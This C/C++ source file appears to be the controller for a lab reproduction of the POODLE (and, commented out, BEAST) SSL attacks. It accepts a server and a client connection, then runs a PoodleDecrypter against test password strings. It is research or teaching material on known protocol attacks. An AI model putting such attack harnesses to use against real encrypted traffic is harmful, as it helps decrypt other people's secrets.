#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "../common/conf.h"
#include "controller.h"
#include "poodle.h"

int main(int argc, char **argv) {
    int sockfd, new_fd;
    int server_fd, client_fd;
    socklen_t len;
    struct sockaddr_in my_addr, their_addr;
    unsigned int myport, lisnum;
    char buf[MAXBUF + 1];

    if (argc != 3 && argc != 5) {
        printf("wrong format of arguments, please follow the guidelines on README\n");
        exit(0);
    }

    // in_addr server_addr;
    // if (inet_aton(argv[1], &server_addr) == 0) {
    //     perror(argv[1]);
    //     exit(errno);
    // }

    // in_addr client_addr;
    // if (inet_aton(argv[2], &client_addr) == 0) {
    //     perror(argv[2]);
    //     exit(errno);
    // }

    if (argv[1])
        myport = atoi(argv[1]);
    else
        myport = 7838;

    if (argv[2])
        lisnum = atoi(argv[2]);
    else
        lisnum = 4;


    /* 开启一个 socket 监听 */
    if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(1);
    } else
        printf("socket created\n");

    bzero(&my_addr, sizeof(my_addr));
    my_addr.sin_family = PF_INET;
    my_addr.sin_port = htons(myport);
    my_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sockfd, (struct sockaddr *) &my_addr, sizeof(struct sockaddr))
            == -1) {
        perror("bind");
        exit(1);
    } else
        printf("binded\n");

    if (listen(sockfd, lisnum) == -1) {
        perror("listen");
        exit(1);
    } else
        printf("begin listen\n");

    for(int i=0; i<2; i++){
        len = sizeof(struct sockaddr);
        if ((new_fd = accept(sockfd, (struct sockaddr *) &their_addr, &len))
                == -1) {
            perror("accept");
            exit(errno);
        } else {
            printf("controller: got connection from %s, port %d, socket %d\n",
                    inet_ntoa(their_addr.sin_addr), ntohs(their_addr.sin_port),
                    new_fd);
            int len = recv(new_fd, buf, MAXBUF, 0);
            printf("%s\n", buf);
            if (buf[0] == 's') server_fd = new_fd;
            if (buf[0] == 'c') client_fd = new_fd;
        }
    }

    bzero(buf, MAXBUF + 1);
    strcpy(buf, "Hello from controller!");
    T_Instr inst = T_Instr::SHUTDOWN_CONNECTION;
    send(server_fd, (char*)&inst, sizeof(T_Instr), 0);
    send(client_fd, (char*)&inst, sizeof(T_Instr), 0);
    CtrlLink* sev_lk = new TCPCtrlLink(server_fd);
    CtrlLink* cli_lk = new TCPCtrlLink(client_fd);
    T_Controller* ctrl = new T_Controller(sev_lk, cli_lk);
    // BeastDecrypter* beast = new BeastDecrypter(MAXBUF, 16, ctrl);
    // if (beast->run("password1", "password")) printf("A successful BEAST attack!\n");
    //     else printf("BEAST attack fails\n");
    
    PoodleDecrypter* poodle = new PoodleDecrypter(MAXBUF, 16, ctrl);
    if (poodle->run("password12", "password")) printf("A successful POODLE attack!\n");
        else printf("POODLE attack fails\n");
    ctrl->send_client_instruction(T_Instr::SHUTDOWN_CONNECTION, nullptr, 0);
    ctrl->send_server_instruction(T_Instr::SHUTDOWN_CONNECTION, nullptr, 0);
    close(client_fd);
    close(server_fd);
    close(sockfd);
    return 0;
}